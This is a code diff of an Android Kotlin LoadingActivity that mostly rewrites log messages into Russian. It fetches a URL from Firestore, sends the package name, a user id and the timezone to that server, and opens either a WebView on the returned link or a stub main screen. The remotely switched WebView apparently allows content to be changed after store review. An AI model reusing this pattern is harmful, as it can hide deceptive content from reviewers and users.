@@ -14,6 +14,8 @@ import com.google.firebase.analytics.ktx.analytics
 import com.google.firebase.firestore.ktx.firestore
 import com.google.firebase.ktx.Firebase
 import com.google.firebase.messaging.FirebaseMessaging
+import com.template.Constants.EMPTY
+import com.template.Constants.TEST
 import com.template.api.ApiInterface
 import com.template.api.RetrofitClient
 import com.template.network.NetworkManager
@@ -38,19 +40,17 @@ class LoadingActivity : AppCompatActivity() {
         appPreferences = AppPreferences(this)
 
         if (NetworkManager.isNetworkAvailable(this)) {
-            // todo refactor all logs
-            doLog("yes")
-            if (appPreferences?.getFirestoreState() == Constants.EMPTY) {
-                doLog("firestore state is empty, open main activity")
+            doLog("сеть есть")
+            if (appPreferences?.getFirestoreState() == EMPTY) {
+                doLog("firestore empty, уже открывался и он пустой -> открываем MainActivity")
                 openMainActivity()
             } else { // делаем это если firestorestate EXIST или null
-                doLog( "firestore state is not empty")
+                doLog("firestore уже содержит ссылку или null")
                 if (appPreferences?.getLink() != null) {
-                    doLog( "we have all we need")
-                    doLog( "open webview, link+ state+ network+")
+                    doLog("имеется уже ссылка, открываем веб вью")
                     openWebActivity(appPreferences?.getLink()!!)
                 } else {
-                    doLog( "firestore first open")
+                    doLog("ссылка содержит null, firestore впервые открываем для получения ссылки")
                     initFirebase()
                     getDataFromFirestore()
                     initRegisterForActivityResult()
@@ -58,19 +58,19 @@ class LoadingActivity : AppCompatActivity() {
                 }
             }
         } else {
-            doLog( "no")
+            doLog("сети нет")
             if (appPreferences?.getLink() != null) {
-                doLog( "we have link")
+                doLog("ссылка сохранена в памяти, открываем веб вью")
                 openWebActivity(appPreferences?.getLink()!!)
             } else {
-                doLog("link absent")
+                doLog("ссылки нет в памяти, открываем мэйн активити")
                 openMainActivity()
             }
         }
     }
 
     private fun doLog(s: String) {
-        Log.d(Constants.TEST, s)
+        Log.d(TEST, s)
     }
 
     private fun initFirebase() {
@@ -89,23 +89,22 @@ class LoadingActivity : AppCompatActivity() {
         docData.get()
             .addOnSuccessListener { document ->
                 if (document != null) {
-                    doLog( "DocumentSnapshot data: ${document.data}")
+                    doLog("данные из firestore: ${document.data}")
                     BASE_URL = document.data?.get("link").toString()
-                    doLog(BASE_URL)
                     appPreferences?.setFirestoreState(Constants.EXIST)
-                    doLog(Constants.EXIST)
+                    doLog("установили firestore state exist")
                     getRequest(BASE_URL)
                 } else {
-                    doLog("No such document")
-                    appPreferences?.setFirestoreState(Constants.EMPTY)
-                    doLog(Constants.EMPTY)
+                    doLog("документ в fierstore не найден")
+                    appPreferences?.setFirestoreState(EMPTY)
+                    doLog("установили firestore state empty")
                     openMainActivity()
                 }
             }
             .addOnFailureListener { exception ->
-                Log.d("result_db", "get failed with ", exception)
-                appPreferences?.setFirestoreState(Constants.EMPTY)
-                doLog(Constants.EMPTY)
+                Log.d(TEST, "не получилось получить ответ от firestore", exception)
+                appPreferences?.setFirestoreState(EMPTY)
+                doLog("установили firestore state empty")
                 openMainActivity()
             }
 
@@ -116,12 +115,11 @@ class LoadingActivity : AppCompatActivity() {
         val timeZone = TimeZone.getDefault()
         val link =
             "$url/?packageid=$packageName&usserid=$userId&getz=$timeZone&getr=utm_source=google-play&utm_medium=organic"
-        doLog(link)
+        doLog("наша итоговая ссылка к серверу: $link")
         makeRequest(link)
     }
 
     private fun makeRequest(link: String) {
-
         val retrofit = RetrofitClient.getInstance(link)
         val apiInterface = retrofit.create(ApiInterface::class.java)
 
@@ -131,24 +129,30 @@ class LoadingActivity : AppCompatActivity() {
                 val code = response.code().toString()
 
                 // todo test
-                val text_link = URL(link).readText()
-                doLog(text_link)
+                //val text_link = URL(link).readText()
+                //doLog(text_link)
 
                 when (code) {
                     "403" -> {
+                        // todo не так, нужно правильно считать текст с открывшегося сайта
+                        //val answer = URL(link).readText()
+                        //doLog("answer: $answer")
+
+
                         val targetLink = response.body()?.link.toString()
-                        doLog(targetLink)
-                        appPreferences?.setFirestoreState(Constants.EMPTY)
-                        doLog(Constants.EMPTY)
+                        doLog("(код 403) ссылка не получена, получено error ($targetLink)")
+                        appPreferences?.setFirestoreState(EMPTY)
+                        doLog("установили firestore state empty")
+                        //doLog("открываем мейн активити, firestore state не трогаю")
                         openMainActivity()
                     }
 
                     "200" -> {
+                        // todo не так, нужно правильно считать текст с открывшегося сайта
                         val targetLink = response.body()?.link.toString()
-                        doLog(targetLink)
+                        doLog("(код 200) получили ссылку от сервера: $targetLink")
                         appPreferences?.setFirestoreState(Constants.EXIST)
-                        doLog(Constants.EXIST)
-                        doLog(targetLink)
+                        doLog("установили firestore state exist")
                         appPreferences?.setLink(targetLink)
                         openWebActivity(targetLink)
                     }
